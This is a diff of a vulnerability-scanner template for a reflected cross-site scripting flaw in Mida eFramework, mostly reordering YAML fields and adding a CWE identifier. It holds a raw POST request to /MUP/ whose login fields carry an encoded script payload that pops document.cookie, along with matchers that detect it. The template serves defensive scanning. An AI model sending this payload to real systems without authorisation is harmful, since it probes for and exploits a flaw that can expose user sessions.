@@ -1,5 +1,4 @@
 id: mida-eframework-xss
-
 info:
   name: Mida eFramework - Cross-Site Scripting
   author: pikpikcu
@@ -10,13 +9,20 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     max-request: 1
-  tags: mida,xss,edb,vuln
-
+  tags: edb,mida,vuln,xss
 http:
-  - raw:
+  - matchers:
+      - status:
+          - 200
+        type: status
+      - type: word
+        words:
+          - '"><script>javascript:alert(document.cookie)</script>'
+    matchers-condition: and
+    raw:
       - |
         POST /MUP/ HTTP/1.1
         Host: {{Hostname}}
@@ -24,14 +30,3 @@ http:
         Referer: {{Hostname}}/MUP
 
         UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E&UPpassword=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - '"><script>javascript:alert(document.cookie)</script>'
-
